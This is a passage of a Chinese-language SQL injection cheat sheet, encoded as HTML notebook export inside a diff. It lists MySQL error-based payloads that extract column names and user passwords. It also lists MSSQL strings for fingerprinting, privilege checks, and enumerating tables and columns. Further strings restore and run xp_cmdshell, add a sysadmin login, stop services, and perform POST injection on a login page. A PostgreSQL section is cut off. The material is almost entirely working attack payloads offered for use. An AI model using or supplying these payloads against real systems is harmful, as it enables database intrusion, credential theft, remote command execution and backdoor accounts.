+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>1+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+=
+DISTINCT+CONCAT(0x7e,0x27,CAST(column_name+AS+CHAR),0x27,0x7e)+FROM+INFORMA=
+TION_SCHEMA.COLUMNS+WHERE+table_schema=3DDATABASE()+AND+table_name=3D0x7573=
+657273+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*=
+2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=3D1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>1+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+=
+CONCAT(0x7e,0x27,cast(password+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+F=
+ROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATIO=
+N_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=3D1</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>&nbsp;</p>
+ <ul type=3Ddisc style=3D'margin-left:.375in;direction:ltr;unicode-bidi:emb=
+ed;
+  margin-top:0in;margin-bottom:0in'>
+  <li style=3D'margin-top:0;margin-bottom:0;vertical-align:middle;line-heig=
+ht:
+      25pt'><span style=3D'font-weight:bold;font-family:微软雅黑;font-s=
+ize:11.0pt'>判断是否具有读写权限</span></li>
+ </ul>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>and (select count(*) from
+ mysql.user)&gt;0/*</span><span lang=3Den-US><span
+ style=3D'mso-spacerun:yes'>       </span></span><span lang=3Dzh-CN>�=
+��常显示为可读写</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>and (select count(file_priv) from mysql.user)&gt;0/*<br>
+  &nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;margin-left:.75in;line-height:25pt;
+ text-indent:-.1666in;font-family:微软雅黑;font-size:11.0pt'><img
+ src=3D"file8792.files/image005.png" width=3D16 height=3D16 alt=3D问题>&n=
+bsp;<span
+ lang=3Dzh-CN>有时候</span><span lang=3Den-US><span style=3D'mso-spaceru=
+n:yes'>  
+ </span>concat_ws </span><span lang=3Dzh-CN>里面的</span><span lang=3Den=
+-US> ':'<span
+ style=3D'mso-spacerun:yes'>   </span></span><span lang=3Dzh-CN>会引起=
+语句报错去掉单引号用</span><span
+ lang=3Den-US>0x3a</span><span lang=3Dzh-CN>这种格式</span></p>
+ <p style=3D'color:#000000;margin:0in;margin-left:.75in;line-height:25pt;
+ text-indent:-.1666in;font-size:11.0pt'><img src=3D"file8792.files/image005=
+.png"
+ width=3D16 height=3D16 alt=3D问题>&nbsp;<span style=3D'font-family:微�=
+�雅黑' lang=3Dzh-CN>有时候一些</span><span
+ style=3D'font-family:微软雅黑' lang=3Den-US>cms</span><span style=3D'f=
+ont-family:微软雅黑'
+ lang=3Dzh-CN>加密后的密码太长通过</span><span style=3D'font-fami=
+ly:微软雅黑' lang=3Den-US>updatexml</span><span
+ style=3D'font-family:微软雅黑' lang=3Dzh-CN>时获取的密码会不�=
+�，可以使用这个命令</span><span
+ style=3D'font-family:微软雅黑' lang=3Den-US><span style=3D'mso-spaceru=
+n:yes'>   </span></span><span
+ style=3D'font-family:微软雅黑' lang=3Dzh-CN>substring(concat(admin_use=
+r,0x5f,admin_pass),10,30)来分开截取，或者使用子查询注入</spa=
+n><span
+ style=3D'font-family:Calibri' lang=3Den-US>/</span><span style=3D'font-fam=
+ily:微软雅黑'
+ lang=3Dzh-CN>或者</span><span style=3D'font-family:微软雅黑' lang=3D=
+en-US>bigint</span><span
+ style=3D'font-family:微软雅黑' lang=3Dzh-CN>方式。</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;text-indent:-.1666in;font-family:微�=
+��雅黑;
+ font-size:11.0pt;color:red'><img src=3D"file8792.files/image002.png" width=
+=3D16
+ height=3D16 alt=3D分类>&nbsp;<span style=3D'font-weight:bold' lang=3Dzh-=
+CN>【</span><span
+ style=3D'font-weight:bold' lang=3Den-US>Mssql</span><span style=3D'font-we=
+ight:bold'
+ lang=3Dzh-CN>注入】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+ lang=3Dzh-CN>mssql 默认数据库</span><span lang=3Den-US><span
+ style=3D'mso-spacerun:yes'>   </span></span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>pubs 低于</span><span lang=3Den-US>Mssql2005</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>model
+ 所有版本</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>msdb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;适用于所�=
+��版本</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>tempdb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;适用于�=
+�有版本</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>northwind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;适用�=
+�所有版本</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>information_schema&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;适用于</span><span
+ lang=3Den-US>MSSQL 2000及更高版本</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+ lang=3Dzh-CN>注释</span><span lang=3Den-US>:<span style=3D'mso-spacerun:=
+yes'>  
+ </span>/*<span style=3D'mso-spacerun:yes'>  </span>--<span
+ style=3D'mso-spacerun:yes'>    </span>;00%</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>判断语句</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and exists (select * from sysobjects) &nbsp; &nbsp; &nbsp; &n=
+bsp;
+ &nbsp; &nbsp; &nbsp;<span style=3D'mso-spacerun:yes'>         
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//判断是否是</=
+span><span
+ lang=3Den-US>MSSQL </span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and exists(select * from tableName)<span
+ style=3D'mso-spacerun:yes'>               </span>//判断某=
+表是否存在</span><span
+ lang=3Den-US>..tableName为表名</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ 1=3D(select @@servername)<span
+ style=3D'mso-spacerun:yes'>                       �=
+�    </span>//本地服务名</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and 1=3Dconvert(int,@@version）</span><span lang=3Den-US> 或
+ &nbsp;1=3D(select @@version)
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//判断数据库版=
+本 </span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>;declare @d int &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nb=
+sp;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+ &nbsp;<span style=3D'mso-spacerun:yes'>                 �=
+�                      
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//是否支持多�=
+�</span><span
+ lang=3Den-US> </span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ (select count(1) from [sysobjects])&gt;=3D0 &nbsp; &nbsp;<span
+ style=3D'mso-spacerun:yes'>                     
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//是否支�=
+�子查询</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ 1=3D(select IS_SRVROLEMEMBER('sysadmin')) &nbsp; &nbsp; &nbsp; &nbsp;
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//判断是否是系统管=
+理员</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ 1=3D(select is_srvrolemember('db_owner') &nbsp; &nbsp; &nbsp; &nbsp; &nbsp=
+;<span
+ style=3D'mso-spacerun:yes'>  
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//判断是否是�=
+�权限</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and 1=3D(select is_srvrolemember('public') &nbsp; &nbsp; &nbs=
+p;
+ &nbsp; &nbsp;<span style=3D'mso-spacerun:yes'>      
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//判断是否为</=
+span><span
+ lang=3Den-US>Public权限</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and 1=3D(Select count(*) FROM master.dbo.sysobjects Where xty=
+pe =3D 'X'
+ AND name =3D 'xp_cmdshell') //判断</span><span lang=3Den-US>XP_CMDSHELL�=
+��否存在</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and 1=3D(select count(*) FROM master.dbo.sysobjects where nam=
+e=3D
+ 'xp_regread') //查看</span><span lang=3Den-US>XP_regread扩展存储过�=
+��是不是已经被删除</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>信息获取</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ user&gt;0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbs=
+p;
+ &nbsp;<span style=3D'mso-spacerun:yes'>                 �=
+�               
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//获取当前数�=
+�库用户名</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ db_name&gt;0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span
+ style=3D'mso-spacerun:yes'>                       �=
+�     
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//获取当前数�=
+�库名称</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and 1=3Dconvert(int,db_name()) &nbsp;或</span><span lang=3De=
+n-US>
+ &nbsp;1=3D(select db_name())<span style=3D'mso-spacerun:yes'>   
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//当前数据库�=
+�</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ 1=3D(select @@servername) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span
+ style=3D'mso-spacerun:yes'>              
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//本地服务名</=
+p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>having
+ 1=3D1 -- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &n=
+bsp;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span
+ style=3D'mso-spacerun:yes'>                       �=
+�  
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//爆取当前数�=
+�库信息</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>group by 表名</span><span lang=3Den-US>.列名 having 1=3D1=
+ -- &nbsp; &nbsp;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span
+ style=3D'mso-spacerun:yes'>                
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//爆取其他表�=
+�，由上句语句得来</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>group by 表名</span><span lang=3Den-US>.列名1,表名.列�=
+�� having 1=3D1 -- &nbsp;
+ &nbsp; &nbsp; &nbsp;<span style=3D'mso-spacerun:yes'>  
+ </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//继续爆当前�=
+�中的其他列名</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ (select top 1 name from (select top N id,name from sysobjects where
+ xtype=3Dchar(85)) T order by id desc)&gt;1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>and
+ (select top col_name(object_id('admin'),N) from sysobjects)&gt;1<span
+ style=3D'mso-spacerun:yes'>            </span>//暴任意表和=
+列</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and (select top 1 name from(select top N id,name from sysobje=
+cts
+ where xtype=3D'U[或</span><span lang=3Den-US>char(85)]' and status&gt;0) =
+order by
+ id desc)&gt;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ //N从1开始递增即可爆当前库中所有表名,按ID降序排列</sp=
+an></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>或</span><span lang=3Den-US> and (select top 1 name from sys=
+objects
+ where xtype=3D'U' and name not in<span style=3D'mso-spacerun:yes'>  </spa=
+n>(select
+ top N name from sysobjects where xtype=3D'u'))&gt;1 &nbsp;
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//同上</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and (select top 1 name from master.dbo.sysdatabases order by
+ dbid)&gt;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//跨库查询</=
+span><span
+ lang=3Den-US>,爆第一个</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and (select top 1 name from master.dbo.sysdatabases where nam=
+e not
+ in (select top N name from master.dbo.sysdatabases order by
+ dbid))&gt;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//跨库查询<=
+/span><span
+ lang=3Den-US>,N从1开始递增</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and (select top 1 col_name(object_id('表名</span><span lang=
+=3Den-US>'),N）from
+ sysobjects)&gt;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//爆指�=
+�表中任意列名,N从1开始递增</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and 1=3D(Select count(*) FROM master.dbo.sysobjects Where xty=
+pe=3D'X'
+ AND name=3D'xp_cmdshell')
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//判断</span><span
+ lang=3Den-US>xp_cmdshell是否存在</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>and 1=3D(select count(*) FROM master.dbo.sysobjects where nam=
+e=3D
+ 'xp_regread') &nbsp;
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//查看</span><span
+ lang=3Den-US>xp_regread扩展存储过程是已被删除</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>;exec sp_addextendedproc xp_cmdshell,'xplog70.dll' &nbsp; &nb=
+sp;
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //恢复</span><span
+ lang=3Den-US>xp_cmdshell</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>;exec
+ sp_addextendedproc ‘xp_cmdshell’,'c:\xplog70.dll’
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//自定义恢复路=
+径</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>;exec sp_dropextendedproc 'xp_cmdshell' &nbsp; &nbsp; &nbsp; =
+&nbsp;
+ &nbsp; &nbsp; &nbsp; &nbsp;
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//删除</span><span
+ lang=3Den-US>xp_cmdshell</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>;exec master..xp_cmdshell 'dir c:\' &nbsp; &nbsp; &nbsp; &nbs=
+p;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//查看服务器</span><s=
+pan
+ lang=3Den-US>C盘目录</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>exec master.dbo.sp_addlogin hakz,password
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;添加和删除一个</spa=
+n><span
+ lang=3Den-US>SA权限的数据库用户hakz:（需要SA权限）</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>exec
+ master.dbo.sp_addsrvrolemember hakz,sysadmin</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>;exec master..xp_servicecontrol 'stop','schedule'<span
+ style=3D'mso-spacerun:yes'>    </span>//规则服务</span><span lang=
+=3Den-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;停掉或激活某=
+个服务:（需要SA权限）</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>;exec
+ master..xp_servicecontrol 'start</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>','schedule'</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+ lang=3Dzh-CN>;exec master..xp_servicecontrol 'start', 'server' &nbsp; &nbs=
+p;
+ &nbsp;//启动</span><span lang=3Den-US>SERVER服务</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>exec
+ master.dbo.sp_addlogin test,password</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+ lang=3Dzh-CN>exec master.dbo.sp_addsrvrolemember test,sysadmin<span
+ style=3D'mso-spacerun:yes'>    </span>//添加一个</span><span lang=
+=3Den-US>sa的管理员</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'
+ lang=3Den-US>&nbsp;</p>
+ <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt' lang=3De=
+n-US>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+ lang=3Den-US>MSSQL </span><span lang=3Dzh-CN>后台</span><span lang=3Den-=
+US>POST</span><span
+ lang=3Dzh-CN>注入</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><a
+ href=3D"http://xxx.com/login.aspx"><span lang=3Den-US>http://xxx.com/login=
+.aspx</span></a><span
+ lang=3Den-US> </span><span lang=3Dzh-CN>登陆点</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Den-US>' having 1=3D1--<span style=3D'mso-spacerun:yes'>      =
+  </span></span><span
+ lang=3Dzh-CN>爆数据库的表段和相关字段</span></p>
+ <p style=3D'margin:0in;margin-left:.75in'><img src=3D"file8792.files/image=
+006.png"
+ width=3D557 height=3D53></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Den-US>' group by Sys_Admin.Password having 1=3D1--<span
+ style=3D'mso-spacerun:yes'>        </span></span><span lang=3Dzh-CN=
+>爆出表段的其他字段</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>如果上面不可以</span><span lang=3Den-US><span style=3D=
+'mso-spacerun:yes'>  
+ </span></span><span lang=3Dzh-CN>就用以下方法</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'
+ lang=3Den-US>1' and 1=3Dconvert(int,(select top 1 col_name(object_id
+ ('Sys_Admin'),1) from Sys_Admin)) and '1'=3D'1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'
+ lang=3Den-US>1' and 1=3Dconvert(int,(select top 1 col_name(object_id
+ ('Sys_Admin'),2) from Sys_Admin)) and '1'=3D'1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'
+ lang=3Den-US>1' and 1=3Dconvert(int,(select top 1 col_name(object_id
+ ('Sys_Admin'),3) from Sys_Admin)) and '1'=3D'1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'> </span>and (select top 1
+ Sys_Admin.Name from Sys_Admin)&gt;0--<span style=3D'mso-spacerun:yes'>  =
+     
+ </span></span><span lang=3Dzh-CN>得到字段后爆字段内容</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><a
+ href=3D"http://xxx.com/login.aspx"><span lang=3Den-US>http://xxx.com/login=
+.aspx</span></a><span
+ lang=3Den-US> </span><span lang=3Dzh-CN>登陆点</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Den-US>' having 1=3D1--<span style=3D'mso-spacerun:yes'>      =
+  </span></span><span
+ lang=3Dzh-CN>爆数据库的表段和相关字段</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Den-US>' group by Sys_Admin.Password having 1=3D1--<span
+ style=3D'mso-spacerun:yes'>        </span></span><span lang=3Dzh-CN=
+>爆出表段的其他字段</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>如果上面不可以</span><span lang=3Den-US><span style=3D=
+'mso-spacerun:yes'>  
+ </span></span><span lang=3Dzh-CN>就用以下方法</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'
+ lang=3Den-US>1' and 1=3Dconvert(int,(select top 1 col_name(object_id
+ ('Sys_Admin'),1) from Sys_Admin)) and '1'=3D'1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'
+ lang=3Den-US>1' and 1=3Dconvert(int,(select top 1 col_name(object_id
+ ('Sys_Admin'),2) from Sys_Admin)) and '1'=3D'1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'
+ lang=3Den-US>1' and 1=3Dconvert(int,(select top 1 col_name(object_id
+ ('Sys_Admin'),3) from Sys_Admin)) and '1'=3D'1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'> </span>and (select top 1
+ Sys_Admin.Name from Sys_Admin)&gt;0--<span style=3D'mso-spacerun:yes'>  =
+     
+ </span></span><span lang=3Dzh-CN>得到字段后爆字段内容</span></p>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt;
+ color:red'>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image001.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ style=3D'font-weight:bold' lang=3Dzh-CN>【</span><span style=3D'font-weig=
+ht:bold'
+ lang=3Den-US>P</span><span style=3D'font-weight:bold' lang=3Dzh-CN>ostgres=
+ql注入】</span></p>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt;
+ color:red'>&nbsp;</p>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt;
+ color:red'>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image002.png" width=3D16 height=3D16 alt=3D分类>&n=
+bsp;<span
+ style=3D'font-weight:bold' lang=3Dzh-CN>【</span><span style=3D'font-weig=
+ht:bold'
